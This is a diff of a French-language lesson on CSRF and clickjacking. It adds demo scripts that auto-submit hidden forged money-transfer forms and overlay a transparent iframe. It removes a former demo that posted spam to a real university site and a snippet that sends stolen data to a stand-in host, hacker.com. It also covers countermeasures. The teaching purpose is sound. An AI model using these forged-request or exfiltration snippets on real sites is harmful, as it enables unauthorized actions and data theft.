@@ -1,7 +1,7 @@
 ---
 layout: lesson
-title: CSRF
-subtitle: Cross Site Request Forgery
+title: CSRF et Clickjacking
+subtitle: Escalade de privilèges trans-domaine
 scripts:  ../js/mock-browser.js
 ---
 
@@ -19,7 +19,7 @@ scripts:  ../js/mock-browser.js
 
 ### Les acteurs
 
-Servane, un **server** web possédant des **données
+Servane, un **serveur** web possédant des **données
 confidentielles**.
 {:.srv}
 
@@ -27,12 +27,9 @@ Clélie, un **utilisateur légitime authentifié** ayant des **droits sur
 les données**.
 {:.cli}
 
-Athanase, un **attaquant** malicieux qui :
-{:.att}
-
-- connaît l'API du serveur (par ex., l'API est publique),
-- contrôle un site tiers **sans rapport avec le server victime** (par
-  ex., son propre server, ou un site avec une injection XSS).
+Athanase, un **attaquant** malicieux qui  contrôle un site tiers
+**sans rapport avec le serveur victime** (par ex., son propre serveur,
+ou un site avec une injection XSS).
 {:.att}
 
 ### Les effets
@@ -50,6 +47,9 @@ Clélie.
 - <span class="cli">Clélie est **logguée sur le serveur**</span> (par
   ex., el garde un onglet ouvert sur une <span class="srv">page de
   Servane</span>) ;
+- Servane utilse un <span class="srv">mécanisme d'authentification
+  sans intervention de l'utilisateur</span> (par. ex., des
+  identifiants de session dans des cookies) ;
 - Clélie tombe (par hasard) sur **la page malicieuse
   d'Athanase**{:.att}.
 
@@ -62,7 +62,7 @@ Clélie.
 <html>
 ...
 <h1>Recipe: Panini Reblochon Nutella</h1>
-<h2>Ingrédients:</h2>
+<h2>Ingredients:</h2>
 <ul>
 <li>Two slices of bread</li>
 ...
@@ -70,7 +70,7 @@ Clélie.
 ~~~
 {:.att}
 
-- Le <span class="cli">browser de Clélie</span>, en voulant
+- Le <span class="cli">navigateur de Clélie</span>, en voulant
   télécharger l'image, déclanche un **transfert d'argent
   authentifié**{:.att}.
 
@@ -78,31 +78,26 @@ Clélie.
 <section>
 
 <style scoped>
-#ecampus.fade-out { opacity: 0 }
-#ecampus, #ecampus.fade-out {
+#bank.fade-out { opacity: 0 }
+#bank, #bank.fade-out {
     transition: opacity 1s;
     -webkit-transition: opacity 1s;
 }
 </style>
 
-## Démo CSRF : e-campus 2
+## Démo CSRF 
 
-1. Connectez-vous à <http://e-campus2.uvsq.fr/>{:.srv},
-2. Allez vers la
-   [page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946){:.srv}.
-3. Maintenant, supposons que vous visitiez un site au hasard (par ex.,
+1. Connectez-vous à <https://aws-security.herokuapp.com/>{:.srv},
+2. Maintenant, supposons que vous visitiez un site au hasard (par ex.,
    <span class="att">ce site</span> !!!), contenant cet `<iframe>`{:.att}
    (caché par [`display:none`](){:.hide-frame}):
 
-<iframe id="ecampus" class="att" style="width:90%;height:4em;margin:auto;display:block">
+<iframe id="bank" class="att" style="width:90%;height:4em;margin:auto;display:block">
 </iframe>
 
-4. Si vous [cliquez ici](){:#csrf}, le formulaire est
+3. Si vous [cliquez ici](){:#csrf}, le formulaire est
    soumis, et le CSRF est exécuté.
-5. Maintenant rafraîchissez
-   [la page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946)
-   et observez le résultat.
-{: start="5"}
+{: start="3"}
 
 
 **Note :** Si le `<iframe>` avait été
@@ -112,22 +107,16 @@ Clélie.
   de l'utilisateur !**
 
 <script>
+var form;
 document.on('DOMContentLoaded', function() {
-	form = Element.prototype.append.call($('#ecampus').contentDocument.body, 'form#ecampus-form');
-	form.method = 'GET';
-	form.action = 'http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946/cours_plan_form';
+	form = Element.prototype.append.call($('#bank').contentDocument.body, 'form#ecampus-form');
+	form.method = 'POST';
+	form.action = 'https://aws-security.herokuapp.com/transfer';
 	form.append = Element.prototype.append.bind(form);
 
-	data = {
-		'typeElement'      : 'TexteLibre',
-		'titreElement'     : 'Cheap Viagra',
-		'createurElement'  : 'Hacker',
-		'form.submitted'   : '1',
-		'form.button.save' : 'label_save'
-	};
-
-	for (n in data) {
-		i = form.append('input');
+	data = { 'to' : 'hacker', 'amount' : '100' };
+	for (var n in data) {
+		var i = form.append('input');
 		i.type = 'text';
 		i.name = n;
 		i.value = data[n];
@@ -145,111 +134,35 @@ $('#csrf').on('click', function(e) {
 
 $$('.hide-frame').forEach(function(t) {
 	t.on('click', function(e) {
-		$('#ecampus').classList.toggle('fade-out');
+		$('#bank').classList.toggle('fade-out');
 		e.preventDefault()
 	});
 });
 </script>
 
 </section>
-<section class="compact">
-
-## AJAX et CSRF : intercepter les données
-
-- À cause de la requête `POST`, l'attaque précédente **n'aurait pas pu
-  être menée** uniquement avec `XMLHttpRequest`.
-- Mais AJAX offre des nouveaux points d'accès aux CSRF !
-
-Imaginez une **API authentifiée** qui renvoie des requêtes JavaScript :
-
-~~~
-HTTP/1.1 200 OK
-Content-Type: text/javascript
-Access-Control-Allow-Origin: *
-...
-
-new UserData(
-  "firstName", "Pinco"
-  "lastName", Pallino",
-  "creditCard", "XXXX XXXX XXXX XXXX",
-);
-~~~
-{:.http}
-
-- Les données sont renvoyées dans un objet `UserData` à `eval`uer.
-- La définition de `UserData` est dans les scripts du client.
-- Ceci est similaire au paradigme
-  [JSONP](http://en.wikipedia.org/wiki/JSONP).
-
-</section>
 <section>
 
-## L'application legitime
+## CSRF et AJAX
 
-1. Clélie charge le JavaScript fourni par le Servane
-{:.cli}
+Les sites construits en AJAX sont classiquement mieux protégés contre
+CSRF :
 
-~~~
-<script src="http://www.servane.org/js/api.js"></script>
-~~~
-{:.srv}
+- Les requêtes de type `XMLHttpRequest` *cross-domain*
+  - **n'envoient pas les cookies** par défaut,
+  - ignorent les entêtes `Set-Cookie` ;
+- Les API de type AJAX sont souvent conçues pour envoyer
+  **explicitement** les données d'authentification avec chaque requête.
 
-2. Le script contient la defintion de `UserData`
-{: start="2"}
+Mais AJAX n'est pas invulnérable à CSRF :
 
-~~~
-function Userdata() { this.creditCard = ... }
-~~~
-{:.srv}
-
-3. Clélie client fait une requête AJAX à l'API
-{: .cli start="3"}
-
-~~~
-xhr = new XMLHttpRequest();
-xhr.open("GET", "http://api.server.com/getUserData?user=1000");
-~~~
-{:.srv}
-
-4. Clélie `eval`ue le JavaScript et traite les données
-{: .cli start="4"}
-
-~~~
-var data = eval(xhr.response());
-var card_number = data[5];
-~~~
-{:.srv}
-
-</section>
-<section>
-
-## L'attaquant
-
-1. Athanase crée une page sur un autre server qu'il contrôle ;
-2. Inclut le JavaScript suivant (qui remplace la définition de
-   `UserData`)
-{:.att}
-   
-~~~
-function UserData() {
-    var img = new Image();
-    img.src = "http://hacker.com/steal?" + Array.join(",", arguments);
-}
-~~~
-{:.att}
-
-3. Il force Clélie à faire une requête à l'API
-{: start="3" .att}
-
-~~~
-xhr = new XMLHttpRequest();
-xhr.open("GET", "http://api.server.com/getUserData?user=1000");
-~~~
-{:.att}
-
-4. Le browser envoye les données à `http://hacker.com/steal` (à cause
-   de l'`Image()`).
-{: start="4" .cli}
+- Les cookies *cross-domain* peuvent être explicitement réactivés avec
+  l'option
+  [`withCredentials`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials) ;
+- L'application doit tout de même vérifier que les actions ont pour
+  origine l'utilisateur ;
+- Certains paradigmes, comme AJAX+JSONP, peuvent exposer à des
+  vulnérabilités de type CSRF.
 
 </section>
 <section>
@@ -262,37 +175,46 @@ ont pu être configurés via CSRF
 - <http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/>
 - <http://www.davidairey.com/google-gmail-security-hijack/>
 
-**GMail 2007 vol de contacts :** les attaquants ont pu voler les
+**GMail 2007 vol de contacts :** (basé sur AJAX+JSONP) les attaquants ont pu voler les
 carnets d'adresses
 
-- Basé sur JSONP, similaire à l'exemple AJAX + CSRF.
 - <http://jeremiahgrossman.blogspot.fr/2007/01/gmail-xsrf-json-call-back-hackery.html>
 - <http://jeremiahgrossman.blogspot.fr/2006/01/advanced-web-attack-techniques-using.html>
+
+**Autres** (d'apres [Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery#History))
+
+- ING Direct : transfert d'argent,
+- YouTube (2008) : contrôler un compte,
+- ...
 
 </section>
 <section>
 
-## Contremesures CSRF
+## Contre-mesures CSRF
 
 ### Utilisateur
 {:.cli}
 
-- Se djélogguer ;
-- Utiliser plusieurs browsers.
+- Se délogguer ;
+- Utiliser plusieurs navigateurs.
 
 ### Développeur
 {:.srv}
 
+De la moins à la plus efficace :
+
 - Préférer POST à GET pour les requêtes qui déclenchent des actions ;
 - Contrôler l'entête `Referer` ;
-- Demander confirmation ;
+- Contrôler l'entête `Origin` ;
 - Faire expirer rapidement les sessions ;
+- Demander confirmation ;
 - Utiliser des  captchas ;
 - Ajouter des informations reliées à la session dans les URLs ;
 - Cacher des jetons aléatoires jetables (**nonces**) dans les
   formulaires.
 
-**Note :** il n'existe pas encore de protection définitive !
+**Note :** il n'existe, et n'existera probablement jamais de
+  protection définitive !
 
 </section>
 <section>
@@ -301,7 +223,7 @@ carnets d'adresses
 
 Demander confirmation **peut ne pas être suffisant !**
 
-Clickjacking : amener l'utilisateur à cliquer le bouton de
+Clickjacking : amener l'utilisateur à cliquer un bouton de
 confirmation sans son consentement
 
 - Inclure le formulaire de confirmation dans un `<iframe>` ;
@@ -310,28 +232,101 @@ confirmation sans son consentement
 - Convaincre l'utilisateur à cliquer sur le contenu inoffensif ;
 - Le clic va au `<iframe>` de confirmation.
 
-**(Seule?) utilisation vérifiée :** Twitter 2009 "Don't click this"
-<http://dsandler.org/outgoing/dontclick_orig.html>
+**Peu d'utilisations vérifiées :**
+
+- Twitter 2009 "Don't click this"
+  <http://dsandler.org/outgoing/dontclick_orig.html>
+
+- Facebook:
+  - [link sharing](http://blog.kotowicz.net/2009/12/new-facebook-clickjagging-attack-in.html)
+	(2009),
+  - [likejacking](https://joshmacdonald.net/1677/facebook-has-no-defence-against-black-hat-marketing)
+	relativement courant (article de 2016).
+
 
 </section>
 <section>
+<style>
+#slider { width:100%; margin:auto; display:block; }
+#main {
+  margin: 1em 3em;
+  position:relative;
+  height: 400px;
+  border: solid thin #aaa;
+}
+#bank2 {
+  position: absolute;
+  width: 100%; height: 300px; top: 100px;
+  overflow: visible;
+  z-index: 1;
+  background-color: #eee;
+}
+#lonely { z-index: 0; padding: 1em; }
+#lonely button { position: absolute; top: 221px; left: 455px; }
+</style>
 
 ## Clickjacking: Exemple
 
-### [Suivez ce lien](../assets/clickjacking.html)
+On ajoute une confirmation avant le transfert :
+<https://aws-security.herokuapp.com/?confirm>
+
+<input id="slider" type="range" min="0" max="1" step="0.01" value="0.01" />
+
+<div id="main">
+<iframe id="bank2"></iframe>
+<div id="lonely">
+### Bienvenue sur LonelyHearts.org
+
+Il y des milliers de LonelyHearts dans notre site !
+
+Ils n'attendent que toi !
+
+**Vite ! Crée ton compte, c'est gratuit !**
+
+<button id="button">Login</button>
+</div>
+</div>
+
+<script>
+$('#slider').on('change', function() {
+    $('#bank2').css({ 'opacity' : $('#slider').value });
+}).dispatchEvent(new Event('change'));
+var form = Element.prototype.append.call($('#bank2').contentDocument.body, 'form#ecampus-form');
+form.method = 'POST';
+form.action = 'https://aws-security.herokuapp.com/transfer-w-confirm';
+form.append = Element.prototype.append.bind(form);
+
+data = { 'to' : 'hacker', 'amount' : '100' };
+for (var n in data) {
+	var i = form.append('input');
+	i.type = 'text';
+	i.name = n;
+	i.value = data[n];
+}
+form.submit();
+</script>
 
 </section>
 <section>
 
-## Contremesures
+## Contre-mesures
 
-Entête `X-Frame-Options`, partie du standard CSP
+- Entête
+  [`X-Frame-Options`](https://developer.mozilla.org/docs/HTTP/X-Frame-Options),
+  partie du standard CSP
+  
+  ~~~
+  X-Frame-Options: SAMEORIGIN
+  ~~~
 
-~~~
-X-Frame-Options: SAMEORIGIN
-~~~
+- Directive
+  [`frame-ancestors`](https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives#frame-ancestors) de la [Content Security Policy](csp).
+  
+  ~~~
+  Content-Security-Policy: frame-ancestors 'self'
+  ~~~
 
-- Empêche aux browsers d'inclure la page dans des frames cross-domain ;
+- Empêchent aux navigateurs d'inclure la page dans des frames *cross-domain* ;
 - Twitter s'en sert depuis 2009...
 
 <div id="sop" data-sandbox="" class="mock-browser content" data-src="https://twitter.com"></div>
@@ -346,16 +341,20 @@ X-Frame-Options: SAMEORIGIN
 
 - <https://code.google.com/p/browsersec/wiki/Part1>,
 - <https://code.google.com/p/browsersec/wiki/Part2>,
-- <https://code.google.com/p/browsersec/wiki/Part3>,
+- <https://code.google.com/p/browsersec/wiki/Part3>.
 
 ### CSRF
 
-- [OWASP sur CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet),
-- The tangled web: <http://lcamtuf.coredump.cx/tangled/>,
+
+- OWASP sur CSRF:
+  [définition](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29),
+  [contre-mesures](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet),
+- The tangled web: <http://lcamtuf.coredump.cx/tangled/>.
 
 ### Clickjacking
 
 - [`X-Frame-Options`](https://developer.mozilla.org/docs/HTTP/X-Frame-Options),
+- Content Security Policy [`frame-ancestors`](https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives#frame-ancestors)
 - [Ajax and Mashup Security](http://www.openajax.org/whitepapers/Ajax and Mashup Security.php#Mashups),
 - [OWASP sur le Clickjacking](https://www.owasp.org/index.php/Clickjacking).
 
